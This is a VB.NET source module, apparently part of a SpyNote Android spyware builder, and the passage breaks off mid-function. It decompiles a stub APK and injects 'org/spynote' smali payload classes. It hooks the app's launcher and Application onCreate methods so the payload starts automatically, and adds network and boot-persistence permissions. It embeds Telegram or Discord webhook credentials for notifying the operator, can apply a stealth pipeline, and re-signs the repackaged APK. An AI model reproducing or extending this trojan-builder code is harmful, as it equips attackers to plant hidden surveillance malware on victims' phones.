Imports System.Diagnostics
Imports System.IO
Imports System.Collections.Generic
Imports System.Linq
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Xml
Imports System.IO.Compression

Public Module ApkNotifyPatcher
    Private Const AndroidNs As String = "http://schemas.android.com/apk/res/android"

    Public Class NotifyPatchReport
        Public ConfigHasCredentials As Boolean
        Public LauncherHookApplied As Boolean
        Public ApplicationHookApplied As Boolean
        Public ProviderInManifest As Boolean
        Public ReceiverInManifest As Boolean
    End Class

    Private _lastNotifyPatchReport As NotifyPatchReport

    Public Function GetLastNotifyPatchReport() As NotifyPatchReport
        Return _lastNotifyPatchReport
    End Function

    Public Function NotifyConfigHasCredentials(cfg As NotifySettingsHelper.NotifyConfig) As Boolean
        Return DeviceNotifyService.NotifyCredentialsConfigured(cfg)
    End Function

    Public Function GetDriveRoot() As String
        Try
            Return Path.GetPathRoot(Process.GetCurrentProcess().MainModule.FileName)
        Catch
            Return "C:\"
        End Try
    End Function

    Public Function GetBuildingClientApkPath() As String
        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool", "out", "client.apk")
    End Function

    Public Function GetBuildingDistApkPath() As String
        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool", "app-release", "dist", "app-release.apk")
    End Function

    Public Function IsValidApkFile(apkPath As String) As Boolean
        Try
            If Not File.Exists(apkPath) Then Return False
            If New FileInfo(apkPath).Length < 50000 Then Return False
            Using archive As ZipArchive = System.IO.Compression.ZipFile.OpenRead(apkPath)
                Dim hasDex As Boolean = archive.Entries.Any(Function(e) e.FullName.EndsWith(".dex", StringComparison.OrdinalIgnoreCase))
                Return hasDex
            End Using
        Catch
            Return False
        End Try
    End Function

    Public Function TrySignDistToClient(ByRef errorMessage As String) As Boolean
        errorMessage = Nothing
        Try
            Dim distApk As String = GetBuildingDistApkPath()
            Dim clientApk As String = GetBuildingClientApkPath()
            If Not File.Exists(distApk) Then
                errorMessage = "Unsigned APK not found: " & distApk
                Return False
            End If

            Dim root As String = Path.Combine(GetDriveRoot(), "Building-6.1", "apktool")
            Dim signJar As String = Path.Combine(root, "SignApk.jar")
            Dim cert As String = Path.Combine(root, "certificate.pem")
            Dim keyPk8 As String = Path.Combine(root, "key.pk8")
            If Not File.Exists(signJar) OrElse Not File.Exists(cert) OrElse Not File.Exists(keyPk8) Then
                errorMessage = "SignApk.jar or keys not found in Building-6.1\apktool"
                Return False
            End If

            Dim signedTemp As String = clientApk & ".signed.tmp"
            If File.Exists(signedTemp) Then File.Delete(signedTemp)

            Dim signErr As String = Nothing
            Dim javaExe As String = FindJavaExecutable(root)
            If Not RunProcess(javaExe, "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & distApk & """ """ & signedTemp & """", root, signErr, True) Then
                errorMessage = "SignApk.jar failed: " & signErr
                Return False
            End If

            If Not IsValidApkFile(signedTemp) Then
                errorMessage = "Signed APK is invalid"
                Return False
            End If

            File.Copy(signedTemp, clientApk, True)
            File.Delete(signedTemp)
            Return True
        Catch ex As Exception
            errorMessage = ex.Message
            Return False
        End Try
    End Function

    Public Function ApkContainsNotifyCode(apkPath As String) As Boolean
        Try
            If Not IsValidApkFile(apkPath) Then Return False
            Using archive As ZipArchive = System.IO.Compression.ZipFile.OpenRead(apkPath)
                For Each dexEntry As ZipArchiveEntry In archive.Entries
                    If Not dexEntry.FullName.EndsWith(".dex", StringComparison.OrdinalIgnoreCase) Then Continue For
                    Using ms As New MemoryStream()
                        Using src As Stream = dexEntry.Open()
                            src.CopyTo(ms)
                        End Using
                        Dim text As String = Encoding.ASCII.GetString(ms.ToArray())
                        If text.Contains("Lorg/spynote/NotifySender;") OrElse
                           text.Contains("Lorg/spynote/NotifyConfig;") OrElse
                           text.Contains("Lorg/spynote/AppBootstrap;") Then
                            Return True
                        End If
                    End Using
                Next
            End Using
        Catch
        End Try
        Return False
    End Function

    Public Function TryEnsureValidClientApk(ByRef errorMessage As String) As Boolean
        errorMessage = Nothing
        Dim clientApk As String = GetBuildingClientApkPath()
        If IsValidApkFile(clientApk) Then Return True
        Return TrySignDistToClient(errorMessage)
    End Function

    Public Function GetBuildingDecompileDir() As String
        Return Path.Combine(GetDriveRoot(), "Building-6.1", "apktool", "app-release")
    End Function

    Public Function TryPrepareDecompiledSource(cfg As NotifySettingsHelper.NotifyConfig, resourcesPath As String, ByRef errorMessage As String) As Boolean
        errorMessage = Nothing
        Try
            If Not cfg.Enabled Then
                errorMessage = "Notifications disabled"
                Return False
            End If

            Dim decodeDir As String = GetBuildingDecompileDir()
            If Not Directory.Exists(decodeDir) Then
                errorMessage = "Decompiled source not found: " & decodeDir & " (run build once so SL.exe creates it)"
                Return False
            End If

            Dim payloadDir As String = Path.Combine(resourcesPath, "Imports", "Payload")
            SanitizeManifestFile(decodeDir)
            WriteNotifyAsset(decodeDir, cfg)
            CopyNotifySmali(decodeDir, payloadDir)
            WriteNotifyConfigSmali(decodeDir, cfg)
            Dim protCfg As New ApkProtectionPatcher.ProtectionConfig With {.Enabled = False}
            ApkProtectionPatcher.EnsureProtectionRuntime(decodeDir, protCfg)
            CopyBootstrapSmali(decodeDir, payloadDir)
            CopyDelaySmali(decodeDir, payloadDir)
            If cfg IsNot Nothing AndAlso cfg.Enabled Then
                EnsureNotifyProviderInManifest(decodeDir)
                EnsureNotifyReceiverInManifest(decodeDir)
            End If
            PatchLauncherHook(decodeDir)
            PatchApplicationHook(decodeDir)
            EnsureInternetPermission(decodeDir)
            EnsureBootPermission(decodeDir)
            Return True
        Catch ex As Exception
            errorMessage = ex.Message
            Return False
        End Try
    End Function

    Public Function TrySignWithBuildingTools(apkPath As String, ByRef errorMessage As String) As Boolean
        errorMessage = Nothing
        Try
            If Not File.Exists(apkPath) Then
                errorMessage = "APK not found"
                Return False
            End If

            Dim root As String = Path.Combine(GetDriveRoot(), "Building-6.1", "apktool")
            Dim signJar As String = Path.Combine(root, "SignApk.jar")
            Dim cert As String = Path.Combine(root, "certificate.pem")
            Dim keyPk8 As String = Path.Combine(root, "key.pk8")
            If Not File.Exists(signJar) OrElse Not File.Exists(cert) OrElse Not File.Exists(keyPk8) Then
                Return TrySignApk(apkPath, Path.Combine(root, "notify.keystore"))
            End If

            Dim signedTemp As String = apkPath & ".signed.tmp"
            If File.Exists(signedTemp) Then File.Delete(signedTemp)

            Dim signErr As String = Nothing
            Dim javaExe As String = FindJavaExecutable(root)
            If Not RunProcess(javaExe, "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & apkPath & """ """ & signedTemp & """", root, signErr, True) Then
                errorMessage = "SignApk.jar failed: " & signErr
                Return False
            End If

            If Not File.Exists(signedTemp) Then
                errorMessage = "Signed APK was not created"
                Return False
            End If

            File.Copy(signedTemp, apkPath, True)
            File.Delete(signedTemp)
            Return True
        Catch ex As Exception
            errorMessage = ex.Message
            Return False
        End Try
    End Function

    Public Function GetStubPathsToPatch(resourcesPath As String) As String()
        Dim root As String = GetDriveRoot()
        Return New String() {
            Path.Combine(resourcesPath, "Imports", "Payload", "stub.apk"),
            Path.Combine(root, "Building-6.1", "apktool", "app-release.apk"),
            Path.Combine(root, "Building-6.1", "apktool", "test-stub.apk")
        }
    End Function

    Public Function TryPatchStubApk(stubPath As String, cfg As NotifySettingsHelper.NotifyConfig) As Boolean
        Dim err As String = Nothing
        Return TryPatchApk(stubPath, cfg, Nothing, err)
    End Function

    Public Function TryPatchApk(apkPath As String, cfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, ByRef errorMessage As String) As Boolean
        errorMessage = Nothing
        Try
            Dim notifyEnabled As Boolean = cfg IsNot Nothing AndAlso cfg.Enabled
            Dim protectionNeedsPatch As Boolean = ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg)
            If notifyEnabled AndAlso Not NotifyConfigHasCredentials(cfg) Then
                errorMessage = "Notify enabled but Telegram token/chat id or Discord webhook is empty"
                Return False
            End If
            If Not notifyEnabled AndAlso Not protectionNeedsPatch AndAlso (protectionCfg Is Nothing OrElse Not protectionCfg.StealthEnabled) Then
                errorMessage = "Nothing to patch"
                Return False
            End If
            If String.IsNullOrWhiteSpace(apkPath) OrElse Not File.Exists(apkPath) Then
                errorMessage = "APK not found: " & apkPath
                Return False
            End If

            Dim payloadDir As String = Path.GetDirectoryName(apkPath)
            If String.IsNullOrWhiteSpace(payloadDir) Then
                errorMessage = "Invalid APK path"
                Return False
            End If

            Dim apktoolJar As String = ExtractApktoolJar(payloadDir)
            If String.IsNullOrWhiteSpace(apktoolJar) OrElse Not File.Exists(apktoolJar) Then
                errorMessage = "apktool.jar not found (need apktool.zip in Payload folder)"
                Return False
            End If
            If Not HasJavaRuntime() Then
                errorMessage = "Java runtime not found (install JDK/JRE and add java to PATH)"
                Return False
            End If

            Dim workRoot As String = Path.Combine(payloadDir, "_notify_apk_work")
            Dim decodeDir As String = Path.Combine(workRoot, "decoded")
            If Directory.Exists(workRoot) Then
                Directory.Delete(workRoot, True)
            End If
            Directory.CreateDirectory(workRoot)

            Dim backupPath As String = apkPath & ".notify.bak"
            File.Copy(apkPath, backupPath, True)

            Dim decodeErr As String = Nothing
            If Not RunProcess("java", "-jar """ & apktoolJar & """ d -r """ & apkPath & """ -o """ & decodeDir & """ -f", payloadDir, decodeErr) Then
                RestoreBackup(apkPath, backupPath)
                errorMessage = "apktool decode failed: " & decodeErr
                Return False
            End If

            SanitizeManifestFile(decodeDir)

            WriteNotifyAsset(decodeDir, cfg)
            CopyNotifySmali(decodeDir, payloadDir)
            WriteNotifyConfigSmali(decodeDir, If(cfg, New NotifySettingsHelper.NotifyConfig()))
            ApkProtectionPatcher.EnsureProtectionRuntime(decodeDir, protectionCfg)
            CopyBootstrapSmali(decodeDir, payloadDir)
            CopyDelaySmali(decodeDir, payloadDir)

            Dim report As New NotifyPatchReport With {
                .ConfigHasCredentials = NotifyConfigHasCredentials(cfg)
            }
            If notifyEnabled Then
                report.ProviderInManifest = EnsureNotifyProviderInManifest(decodeDir)
                report.ReceiverInManifest = EnsureNotifyReceiverInManifest(decodeDir)
            End If
            report.LauncherHookApplied = PatchLauncherHook(decodeDir)
            report.ApplicationHookApplied = PatchApplicationHook(decodeDir)
            _lastNotifyPatchReport = report

            EnsureInternetPermission(decodeDir)
            EnsureBootPermission(decodeDir)

            If protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled Then
                ApkStealthPatcher.ApplyStealthPipeline(decodeDir, protectionCfg)
            End If

            Dim rebuiltPath As String = Path.Combine(workRoot, "rebuilt.apk")
            Dim buildErr As String = Nothing
            If Not RunProcess("java", "-jar """ & apktoolJar & """ b -f -r """ & decodeDir & """ -o """ & rebuiltPath & """", payloadDir, buildErr) Then
                RestoreBackup(apkPath, backupPath)
                errorMessage = "apktool build failed: " & buildErr
                Return False
            End If

            If Not File.Exists(rebuiltPath) Then
                RestoreBackup(apkPath, backupPath)
                errorMessage = "Rebuilt APK missing"
                Return False
            End If

            If Not IsValidApkFile(rebuiltPath) Then
                RestoreBackup(apkPath, backupPath)
                errorMessage = "Rebuilt APK is invalid (missing DEX or corrupt zip)"
                Return False
            End If

            File.Copy(rebuiltPath, apkPath, True)
            Return True
        Catch ex As Exception
            errorMessage = ex.Message
            Return False
        End Try
    End Function

    Public Function TrySignApk(apkPath As String, keystorePath As String) As Boolean
        Try
            If Not File.Exists(apkPath) Then Return False

            Dim keystoreDir As String = Path.GetDirectoryName(keystorePath)
            If Not String.IsNullOrWhiteSpace(keystoreDir) Then
                Directory.CreateDirectory(keystoreDir)
            End If

            If Not File.Exists(keystorePath) Then
                EnsureTestKeystore(keystorePath)
            End If
            If Not File.Exists(keystorePath) Then Return False

            Dim signErr As String = Nothing
            Return RunProcess(
                "jarsigner",
                "-sigalg SHA1withRSA -digestalg SHA1 -keystore """ & keystorePath & """ -storepass 123456 -keypass 123456 """ & apkPath & """ test",
                Path.GetDirectoryName(apkPath),
                signErr,
                True)
        Catch
            Return False
        End Try
    End Function

    Private Sub EnsureTestKeystore(keystorePath As String)
        Try
            Dim genErr As String = Nothing
            RunProcess(
                "keytool",
                "-genkey -v -keystore """ & keystorePath & """ -alias test -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname ""CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US""",
                Path.GetDirectoryName(keystorePath),
                genErr,
                True)
        Catch
        End Try
    End Sub

    Private Sub RestoreBackup(apkPath As String, backupPath As String)
        Try
            If File.Exists(backupPath) Then
                File.Copy(backupPath, apkPath, True)
            End If
        Catch
        End Try
    End Sub

    Private Function ExtractApktoolJar(payloadDir As String) As String
        Try
            Dim searchDirs As New List(Of String) From {payloadDir}
            Dim resourcesPayload As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload")
            If Not searchDirs.Contains(resourcesPayload) Then
                searchDirs.Add(resourcesPayload)
            End If

            For Each dir As String In searchDirs
                Dim zipPath As String = Path.Combine(dir, "apktool.zip")
                Dim jarPath As String = Path.Combine(payloadDir, "_apktool.jar")
                If File.Exists(jarPath) Then Return jarPath
                If Not File.Exists(zipPath) Then Continue For

                Using archive As ZipArchive = System.IO.Compression.ZipFile.OpenRead(zipPath)
                    For Each entry As ZipArchiveEntry In archive.Entries
                        If Not entry.FullName.EndsWith("apktool.jar", StringComparison.OrdinalIgnoreCase) Then Continue For
                        Using fs As New FileStream(jarPath, FileMode.Create, FileAccess.Write)
                            Using entryStream As Stream = entry.Open()
                                entryStream.CopyTo(fs)
                            End Using
                        End Using
                        Exit For
                    Next
                End Using
                If File.Exists(jarPath) Then Return jarPath
            Next
            Return Nothing
        Catch
            Return Nothing
        End Try
    End Function

    Private Function HasJavaRuntime() As Boolean
        Dim err As String = Nothing
        Return RunProcess("java", "-version", Environment.CurrentDirectory, err, True)
    End Function

    Private Function RunProcess(fileName As String, arguments As String, workingDirectory As String, ByRef errorOutput As String, Optional allowNonZero As Boolean = False) As Boolean
        errorOutput = String.Empty
        Try
            Dim psi As New ProcessStartInfo() With {
                .FileName = fileName,
                .Arguments = arguments,
                .WorkingDirectory = If(String.IsNullOrWhiteSpace(workingDirectory), Environment.CurrentDirectory, workingDirectory),
                .UseShellExecute = False,
                .CreateNoWindow = True,
                .RedirectStandardOutput = True,
                .RedirectStandardError = True
            }
            Using p As Process = Process.Start(psi)
                Dim stdout As String = p.StandardOutput.ReadToEnd()
                Dim stderr As String = p.StandardError.ReadToEnd()
                p.WaitForExit()
                errorOutput = If(String.IsNullOrWhiteSpace(stderr), stdout, stderr).Trim()
                If errorOutput.Length > 300 Then
                    errorOutput = errorOutput.Substring(0, 300)
                End If
                Return allowNonZero OrElse p.ExitCode = 0
            End Using
        Catch ex As Exception
            errorOutput = ex.Message
            Return False
        End Try
    End Function

    Public Function BuildNotifyConfigText(cfg As NotifySettingsHelper.NotifyConfig) As String
        Dim sb As New StringBuilder()
        sb.AppendLine("enabled=" & If(cfg.Enabled, "true", "false"))
        sb.AppendLine("type=" & If(cfg.NotifyType, String.Empty).ToLowerInvariant())
        sb.AppendLine("token=" & If(cfg.TelegramToken, String.Empty).Trim())
        sb.AppendLine("chatid=" & If(cfg.TelegramChatId, String.Empty).Trim())
        sb.AppendLine("webhook=" & If(cfg.DiscordWebhook, String.Empty).Trim())
        Return sb.ToString()
    End Function

    Private Function EscapeForSmaliString(value As String) As String
        If value Is Nothing Then Return String.Empty
        Return value.Replace("\", "\\").Replace("""", "\""").Replace(vbCr, "").Replace(vbLf, "\n").Replace(vbTab, "\t")
    End Function

    Private Sub WriteNotifyConfigSmali(decodeDir As String, cfg As NotifySettingsHelper.NotifyConfig)
        Dim smaliDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
        Directory.CreateDirectory(smaliDir)

        Dim lines As String() = BuildNotifyConfigText(cfg).Split(New String() {vbCrLf, vbLf, vbCr}, StringSplitOptions.RemoveEmptyEntries)
        Dim sb As New StringBuilder()
        sb.AppendLine(".class public Lorg/spynote/NotifyConfig;")
        sb.AppendLine(".super Ljava/lang/Object;")
        sb.AppendLine(".source ""NotifyConfig.java""")
        sb.AppendLine()
        sb.AppendLine(".method public static getConfig()Ljava/lang/String;")
        sb.AppendLine("    .locals 2")
        sb.AppendLine("    new-instance v0, Ljava/lang/StringBuilder;")
        sb.AppendLine("    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V")

        For Each line As String In lines
            Dim piece As String = EscapeForSmaliString(line.Trim()) & "\n"
            sb.AppendLine("    const-string v1, """ & piece & """")
            sb.AppendLine("    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;")
        Next

        sb.AppendLine("    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;")
        sb.AppendLine("    move-result-object v0")
        sb.AppendLine("    return-object v0")
        sb.AppendLine(".end method")

        Dim smaliPath As String = Path.Combine(smaliDir, "NotifyConfig.smali")
        File.WriteAllText(smaliPath, sb.ToString(), New UTF8Encoding(False))
    End Sub

    Private Sub WriteNotifyAsset(decodeDir As String, cfg As NotifySettingsHelper.NotifyConfig)
        If cfg Is Nothing Then Return
        Dim assetsDir As String = Path.Combine(decodeDir, "assets")
        Directory.CreateDirectory(assetsDir)
        File.WriteAllText(Path.Combine(assetsDir, "spynote_notify.cfg"), BuildNotifyConfigText(cfg), New UTF8Encoding(False))
    End Sub

    Public Function TryUpdateConfigInApk(apkPath As String, cfg As NotifySettingsHelper.NotifyConfig) As Boolean
        Try
            If Not IsValidApkFile(apkPath) Then Return False

            Dim tempPath As String = apkPath & ".cfg.tmp"
            If File.Exists(tempPath) Then File.Delete(tempPath)

            Dim cfgBytes As Byte() = New UTF8Encoding(False).GetBytes(BuildNotifyConfigText(cfg))
            Const entryName As String = "assets/spynote_notify.cfg"

            Using source As ZipArchive = System.IO.Compression.ZipFile.OpenRead(apkPath)
                Using target As ZipArchive = System.IO.Compression.ZipFile.Open(tempPath, ZipArchiveMode.Create)
                    For Each entry As ZipArchiveEntry In source.Entries
                        If String.Equals(entry.FullName, entryName, StringComparison.OrdinalIgnoreCase) Then Continue For
                        Dim newEntry As ZipArchiveEntry = target.CreateEntry(entry.FullName, CompressionLevel.Optimal)
                        Using src As Stream = entry.Open()
                            Using dst As Stream = newEntry.Open()
                                src.CopyTo(dst)
                            End Using
                        End Using
                    Next
                    Dim cfgEntry As ZipArchiveEntry = target.CreateEntry(entryName, CompressionLevel.Optimal)
                    Using dst As Stream = cfgEntry.Open()
                        dst.Write(cfgBytes, 0, cfgBytes.Length)
                    End Using
                End Using
            End Using

            If Not IsValidApkFile(tempPath) Then Return False
            File.Copy(tempPath, apkPath, True)
            File.Delete(tempPath)
            Return True
        Catch
            Return False
        End Try
    End Function

    Private Function FindJavaExecutable(root As String) As String
        Dim candidates As String() = {
            Path.Combine(root, "jre", "bin", "java.exe"),
            "C:\Program Files (x86)\Java\jre1.8.0_501\bin\java.exe",
            "C:\Program Files (x86)\Java\jre1.8.0_461\bin\java.exe",
            "C:\Program Files\Java\jre1.8.0_501\bin\java.exe"
        }
        For Each candidate As String In candidates
            If File.Exists(candidate) Then Return candidate
        Next
        Return "java"
    End Function

    Private Sub CopyNotifySmali(decodeDir As String, payloadDir As String)
        Dim searchDirs As New List(Of String) From {
            Path.Combine(payloadDir, "notify_smali"),
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "notify_smali")
        }

        Dim sourceRoot As String = Nothing
        For Each candidate As String In searchDirs
            If Directory.Exists(candidate) Then
                sourceRoot = candidate
                Exit For
            End If
        Next
        If String.IsNullOrWhiteSpace(sourceRoot) Then Return

        Dim targetSmaliRoot As String = Path.Combine(decodeDir, "smali")
        CopyDirectory(sourceRoot, targetSmaliRoot)
    End Sub

    Private Sub CopyDirectory(sourceDir As String, targetDir As String)
        For Each dirPath As String In Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories)
            Directory.CreateDirectory(dirPath.Replace(sourceDir, targetDir))
        Next
        For Each filePath As String In Directory.GetFiles(sourceDir, "*.*", SearchOption.AllDirectories)
            If String.Equals(Path.GetFileName(filePath), "NotifyConfig.smali", StringComparison.OrdinalIgnoreCase) Then Continue For
            Dim dest As String = filePath.Replace(sourceDir, targetDir)
            Directory.CreateDirectory(Path.GetDirectoryName(dest))
            File.Copy(filePath, dest, True)
        Next
    End Sub

    Private Function GetAndroidAttr(node As XmlNode, attrName As String) As String
        If node Is Nothing Then Return String.Empty
        Dim attr As XmlAttribute = node.Attributes("android:" & attrName)
        If attr IsNot Nothing Then Return attr.Value
        attr = node.Attributes(attrName)
        If attr IsNot Nothing Then Return attr.Value
        Dim el As XmlElement = TryCast(node, XmlElement)
        If el IsNot Nothing Then
            Return el.GetAttribute(attrName, AndroidNs)
        End If
        Return String.Empty
    End Function

    Private Sub SanitizeManifestFile(decodeDir As String)
        Try
            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
            If Not File.Exists(manifestPath) Then Return

            Dim bytes As Byte() = File.ReadAllBytes(manifestPath)
            Dim cleaned As New List(Of Byte)(bytes.Length)
            For Each b As Byte In bytes
                If b = 9 OrElse b = 10 OrElse b = 13 OrElse b >= 32 Then
                    cleaned.Add(b)
                End If
            Next
            File.WriteAllBytes(manifestPath, cleaned.ToArray())
        Catch
        End Try
    End Sub

    Private Sub EnsureInternetPermission(decodeDir As String)
        Try
            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
            If Not File.Exists(manifestPath) Then Return

            SanitizeManifestFile(decodeDir)
            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            Dim permissions As String() = {
                "android.permission.INTERNET",
                "android.permission.ACCESS_NETWORK_STATE",
                "android.permission.ACCESS_WIFI_STATE"
            }

            Dim changed As Boolean = False
            For Each permissionName As String In permissions
                If text.IndexOf(permissionName, StringComparison.OrdinalIgnoreCase) >= 0 Then Continue For
                Dim line As String = "    <uses-permission android:name=""" & permissionName & """/>" & vbCrLf
                Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
                If appIdx >= 0 Then
                    text = text.Insert(appIdx, line)
                Else
                    Dim manifestIdx As Integer = text.IndexOf("<manifest", StringComparison.OrdinalIgnoreCase)
                    If manifestIdx < 0 Then Return
                    Dim insertAt As Integer = text.IndexOf(">"c, manifestIdx)
                    If insertAt < 0 Then Return
                    insertAt += 1
                    text = text.Insert(insertAt, vbCrLf & line)
                End If
                changed = True
            Next

            If changed Then
                File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
            End If
        Catch
        End Try
    End Sub

    Private Sub CopyBootstrapSmali(decodeDir As String, payloadDir As String)
        Dim searchDirs As New List(Of String) From {
            Path.Combine(payloadDir, "notify_smali"),
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "notify_smali")
        }

        Dim files As String() = {"AppBootstrap.smali", "BootstrapWorker.smali"}
        For Each candidate As String In searchDirs
            If Not Directory.Exists(candidate) Then Continue For
            Dim targetDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
            Directory.CreateDirectory(targetDir)
            For Each fileName As String In files
                Dim source As String = Path.Combine(candidate, "org", "spynote", fileName)
                If File.Exists(source) Then
                    File.Copy(source, Path.Combine(targetDir, fileName), True)
                End If
            Next
            Return
        Next
    End Sub

    Private Sub CopyDelaySmali(decodeDir As String, payloadDir As String)
        Dim searchDirs As New List(Of String) From {
            Path.Combine(payloadDir, "stealth_smali"),
            Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload", "stealth_smali")
        }

        Dim files As String() = {"DelayGate.smali", "DelayEventsReceiver.smali"}
        For Each candidate As String In searchDirs
            If Not Directory.Exists(candidate) Then Continue For
            Dim targetDir As String = Path.Combine(decodeDir, "smali", "org", "spynote")
            Directory.CreateDirectory(targetDir)
            For Each fileName As String In files
                Dim source As String = Path.Combine(candidate, "org", "spynote", fileName)
                If File.Exists(source) Then
                    File.Copy(source, Path.Combine(targetDir, fileName), True)
                End If
            Next
            Return
        Next
    End Sub

    Private Sub EnsureBootPermission(decodeDir As String)
        EnsureManifestPermission(decodeDir, "android.permission.RECEIVE_BOOT_COMPLETED")
    End Sub

    Private Sub EnsureManifestPermission(decodeDir As String, permissionName As String)
        Try
            Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
            If Not File.Exists(manifestPath) Then Return
            SanitizeManifestFile(decodeDir)
            Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
            If text.IndexOf(permissionName, StringComparison.OrdinalIgnoreCase) >= 0 Then Return
            Dim line As String = "    <uses-permission android:name=""" & permissionName & """/>" & vbCrLf
            Dim appIdx As Integer = text.IndexOf("<application", StringComparison.OrdinalIgnoreCase)
            If appIdx >= 0 Then
                text = text.Insert(appIdx, line)
            Else
                Dim manifestIdx As Integer = text.IndexOf("<manifest", StringComparison.OrdinalIgnoreCase)
                If manifestIdx < 0 Then Return
                Dim insertAt As Integer = text.IndexOf(">"c, manifestIdx) + 1
                text = text.Insert(insertAt, vbCrLf & line)
            End If
            File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
        Catch
        End Try
    End Sub

    Private Function PatchLauncherHook(decodeDir As String) As Boolean
        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
        Dim launcherClass As String = FindLauncherActivityClass(manifestPath)
        If String.IsNullOrWhiteSpace(launcherClass) Then Return False

        Dim smaliPath As String = ClassNameToSmaliPath(decodeDir, launcherClass)
        If Not File.Exists(smaliPath) Then Return False

        Dim classDescriptor As String = "L" & launcherClass.Replace("."c, "/"c) & ";"
        Dim hook As String = "    invoke-virtual {p0}, " & classDescriptor & "->getApplicationContext()Landroid/content/Context;" & vbCrLf &
            "    move-result-object v0" & vbCrLf &
            "    invoke-static {v0}, Lorg/spynote/AppBootstrap;->onStart(Landroid/content/Context;)V" & vbCrLf

        Dim signatures As String() = {
            ".method protected onCreate(Landroid/os/Bundle;)V",
            ".method public onCreate(Landroid/os/Bundle;)V"
        }

        Dim text As String = File.ReadAllText(smaliPath)
        If text.Contains("Lorg/spynote/AppBootstrap;") Then Return True

        For Each signature As String In signatures
            If PatchOnCreateMethod(text, signature, classDescriptor, hook) Then
                File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
                Return True
            End If
        Next
        Return False
    End Function

    Private Function PatchOnCreateMethod(ByRef text As String, methodSignature As String, classDescriptor As String, hook As String) As Boolean
        Dim onCreateStart As Integer = text.IndexOf(methodSignature, StringComparison.Ordinal)
        If onCreateStart < 0 Then Return False

        Dim onCreateEnd As Integer = text.IndexOf(".end method", onCreateStart, StringComparison.Ordinal)
        If onCreateEnd < 0 Then Return False

        Dim onCreateBlock As String = text.Substring(onCreateStart, onCreateEnd - onCreateStart)
        If onCreateBlock.Contains("Lorg/spynote/AppBootstrap;") Then Return True

        Dim cCall As String = "invoke-direct {p0}, " & classDescriptor & "->c()V"
        Dim insertAt As Integer = -1

        Dim cIdx As Integer = onCreateBlock.IndexOf(cCall, StringComparison.Ordinal)
        If cIdx >= 0 Then
            insertAt = onCreateStart + cIdx + cCall.Length
        Else
            Dim superCall As String = "invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
            Dim superIdx As Integer = onCreateBlock.IndexOf(superCall, StringComparison.Ordinal)
            If superIdx >= 0 Then
                insertAt = onCreateStart + superIdx + superCall.Length
            Else
                Dim returnIdx As Integer = onCreateBlock.LastIndexOf("return-void", StringComparison.Ordinal)
                If returnIdx >= 0 Then
                    insertAt = onCreateStart + returnIdx
                End If
            End If
        End If

        If insertAt < 0 Then Return False
        If insertAt < text.Length AndAlso text(insertAt) = vbCr Then insertAt += 1
        If insertAt < text.Length AndAlso text(insertAt) = vbLf Then insertAt += 1

        text = text.Insert(insertAt, hook)

        Dim localsPattern As String = Regex.Escape(methodSignature) & "\s*\r?\n\s*\.locals (\d+)"
        Dim localsMatch As Match = Regex.Match(text, localsPattern, RegexOptions.None, TimeSpan.FromSeconds(1))
        If localsMatch.Success Then
            Dim neededLocals As Integer = Math.Max(2, Integer.Parse(localsMatch.Groups(1).Value))
            text = Regex.Replace(
                text,
                localsPattern,
                methodSignature & vbCrLf & "    .locals " & neededLocals.ToString(),
                RegexOptions.None,
                TimeSpan.FromSeconds(1))
        End If
        Return True
    End Function

    Private Function PatchApplicationHook(decodeDir As String) As Boolean
        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
        Dim appClass As String = FindApplicationClass(manifestPath)
        If String.IsNullOrWhiteSpace(appClass) Then Return False

        Dim smaliPath As String = ClassNameToSmaliPath(decodeDir, appClass)
        If Not File.Exists(smaliPath) Then Return False

        Dim classDescriptor As String = "L" & appClass.Replace("."c, "/"c) & ";"
        Dim hook As String = "    invoke-virtual {p0}, " & classDescriptor & "->getApplicationContext()Landroid/content/Context;" & vbCrLf &
            "    move-result-object v0" & vbCrLf &
            "    invoke-static {v0}, Lorg/spynote/AppBootstrap;->onStart(Landroid/content/Context;)V" & vbCrLf

        Dim text As String = File.ReadAllText(smaliPath)
        If text.Contains("Lorg/spynote/AppBootstrap;") Then Return True

        Dim signature As String = ".method public onCreate()V"
        Dim onCreateStart As Integer = text.IndexOf(signature, StringComparison.Ordinal)
        If onCreateStart < 0 Then Return False

        Dim onCreateEnd As Integer = text.IndexOf(".end method", onCreateStart, StringComparison.Ordinal)
        If onCreateEnd < 0 Then Return False

        Dim onCreateBlock As String = text.Substring(onCreateStart, onCreateEnd - onCreateStart)
        Dim superCall As String = "invoke-super {p0}, Landroid/app/Application;->onCreate()V"
